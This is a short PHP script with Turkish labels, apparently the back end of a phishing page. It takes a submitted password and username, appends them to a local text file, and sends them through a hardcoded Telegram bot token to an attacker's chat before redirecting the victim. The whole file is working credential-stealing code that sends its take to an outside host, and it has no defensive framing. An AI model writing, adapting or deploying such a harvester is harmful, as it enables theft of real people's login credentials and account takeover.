
<?php
$id=$username;
if($_POST){
$password=$_POST["password"];


$dosya = "deus.txt";

$lupentxt=fopen($dosya, "a+");

$text = "
<html>
<head>
    <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<title>norwad textisine hoşgeldiniz</title>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<font color='pink'> Form Sayfası: </font><br>
<font color='red'> Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<hr />

"; 
$token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';

$data = [
    'text' => '

Kullanıcı Adı : '.$username.' 
Şifre : '.$password.' 
',
    'chat_id' =>-1001586201889
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

fwrite($lupentxt, $text);
fclose($file);
header("location: info.php?nick=$username");
}
?>
